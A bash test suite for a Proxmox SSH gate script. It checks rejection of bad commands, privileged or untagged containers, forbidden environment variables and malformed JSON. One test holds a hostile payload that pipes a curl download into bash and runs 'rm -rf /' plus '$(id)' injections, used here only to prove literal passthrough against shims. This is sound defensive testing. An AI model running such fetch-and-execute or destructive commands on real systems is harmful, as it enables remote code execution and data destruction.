#!/usr/bin/env bash
# shellcheck shell=bash
# Host-side SSH gate (F-01): every rejection path + literal argv passthrough.
# SC2016 is disabled on purpose: the hostile payloads below must stay literal (unexpanded).
# shellcheck disable=SC2016
set -euo pipefail
# shellcheck source=lib.sh
source "$(dirname "${BASH_SOURCE[0]}")/lib.sh"
setup_env
GATE="$DEPLOY_DIR/host/proxmox-gui-ssh-gate"
export PGUI_GATE_PCT="$TESTS_DIR/shims/pct"
export PGUI_GATE_LOGGER="$TESTS_DIR/shims/logger"

ct_config() {  # ct_config <unprivileged 0|1> <tags or ''>
    local u="$1" t="$2"
    {
        echo 'handle() {'
        echo '  case "$1" in'
        echo "    config) echo 'hostname: app'; echo 'unprivileged: $u'; [[ -n '$t' ]] && echo 'tags: $t'; return 0 ;;"
        echo '    list) echo "VMID Status Lock Name"; return 0 ;;'
        echo '    exec) cat >"$T_TMP/ct-stdin"; return 7 ;;'
        echo '  esac'
        echo '}'
    } >"$SHIM_CFG/pct.sh"
}

gate() {  # gate <ssh-original-command> <stdin-text>
    local cmd="$1" input="$2"
    local so="$T_TMP/o" se="$T_TMP/e"
    set +e
    printf '%s' "$input" | SSH_ORIGINAL_COMMAND="$cmd" timeout 30 perl "$GATE" >"$so" 2>"$se"
    RC=$?
    set -e
    OUT="$(cat "$so")"; ERR="$(cat "$se")"
    export OUT ERR
}
ok_req='{"env":{"CTID":"201"},"argv":["bash","-c","echo hi"]}'

test_case "preflight runs only pct list"
reset_env; ct_config 1 proxmox-gui
gate preflight ""
assert_rc 0 "preflight rc"; assert_contains "$OUT" "PREFLIGHT_OK" "marker"
assert_logged "pct list" "pct list executed"
assert_not_logged "pct exec" "no exec in preflight"

test_case "unknown / extended commands are rejected"
for c in "" "ls" "exec" "exec 201 extra" "exec 201; id" "exec 12" "exec 0201" "exec -1" 'exec $(id)' "preflight extra" "scp -t /tmp"; do
    reset_env; ct_config 1 proxmox-gui
    gate "$c" "$ok_req"$'\n'
    assert_rc 126 "command '$c'"
    assert_not_logged "pct exec" "no exec for '$c'"
done

test_case "nonexistent CT"
reset_env
shim_handler pct <<'H'
    [[ "$1" == config ]] && { echo "Configuration file 'nodes/x/lxc/201.conf' does not exist" >&2; return 2; }
    return 0
H
gate "exec 201" "$ok_req"$'\n'
assert_rc 126 "missing CT"; assert_not_logged "pct exec" "no exec"

test_case "privileged CT is rejected"
reset_env; ct_config 0 proxmox-gui
gate "exec 201" "$ok_req"$'\n'
assert_rc 126 "privileged"; assert_contains "$ERR" "privileged" "message"; assert_not_logged "pct exec"

test_case "CT without tag / other tag"
reset_env; ct_config 1 ""
gate "exec 201" "$ok_req"$'\n'
assert_rc 126 "no tag"; assert_not_logged "pct exec"
reset_env; ct_config 1 "prod;other"
gate "exec 201" "$ok_req"$'\n'
assert_rc 126 "other tags"; assert_not_logged "pct exec"
reset_env; ct_config 1 "proxmox-gui-not"
gate "exec 201" "$ok_req"$'\n'
assert_rc 126 "tag prefix must not match"; assert_not_logged "pct exec"

test_case "forbidden / invalid env names"
for n in LD_PRELOAD BASH_ENV ENV PATH IFS PERL5OPT PERL5LIB SHELLOPTS 'A-B' '1A' 'A B' ''; do
    reset_env; ct_config 1 proxmox-gui
    req="$(python3 -c 'import json,sys;print(json.dumps({"env":{sys.argv[1]:"x"},"argv":["true"]}))' "$n")"
    gate "exec 201" "$req"$'\n'
    assert_rc 126 "env name '$n'"; assert_not_logged "pct exec" "env '$n'"
done

test_case "malformed JSON, wrong shapes, oversize"
for req in 'not json' '[]' '{"argv":[]}' '{"argv":"true"}' '{"argv":[1]}' '{"argv":[true]}' '{"env":{"A":1},"argv":["true"]}' '{"argv":["-x"]}' '{"argv":["A=b"]}' \
           '{"argv":["true"],"extra":1}' '{"env":[],"argv":["true"]}' '{"env":{"A":null},"argv":["true"]}' '{"argv":[""]}'; do
    reset_env; ct_config 1 proxmox-gui
    gate "exec 201" "$req"$'\n'
    assert_rc 126 "request '$req'"; assert_not_logged "pct exec" "request '$req'"
done
reset_env; ct_config 1 proxmox-gui
big="$(python3 -c 'print("{\"argv\":[\"" + "a"*70000 + "\"]}")')"
gate "exec 201" "$big"$'\n'
assert_rc 126 "oversized JSON"; assert_not_logged "pct exec" "oversized"
reset_env; ct_config 1 proxmox-gui
gate "exec 201" "$(python3 -c 'print("{\"argv\":[\"" + "a"*20000 + "\"]}")')"$'\n'
assert_rc 126 "oversized argument"
reset_env; ct_config 1 proxmox-gui
gate "exec 201" ""
assert_rc 126 "missing request line"

test_case "metacharacters reach pct as literal arguments, env goes inside the CT"
reset_env; ct_config 1 proxmox-gui
evil='{"env":{"CTID":"201","app":"x; id"},"argv":["bash","-c","yes y | bash -c \"$(curl -fsSL https://h/x)\"; $(id) `id` && rm -rf /"]}'
gate "exec 201" "$evil"$'\n'"y"$'\n'"y"$'\n'
assert_rc 7 "exit code of the CT process is propagated"
assert_logged 'pct exec 201 -- env CTID=201 app=x\;\ id bash -c' "env applied inside the CT via env(1)"
assert_logged '\$\(id\)\ \`id\`\ \&\&\ rm\ -rf\ /' "metacharacters literal (shell-quoted in the log = one argv element)"
assert_eq $'y\ny' "$(cat "$T_TMP/ct-stdin")" "remaining stdin forwarded untouched"
assert_eq "0" "$(grep '^logger' "$SHIM_LOG" | grep -c 'rm -rf\|curl\|x; id')" "argv/env content never sent to syslog"
assert_logged "logger -t proxmox-gui-gate" "logger used"

test_case "no env → no env(1) wrapper"
reset_env; ct_config 1 proxmox-gui
gate "exec 201" '{"argv":["true"]}'$'\n'
assert_logged "pct exec 201 -- true"; assert_not_logged "pct exec 201 -- env"

finish
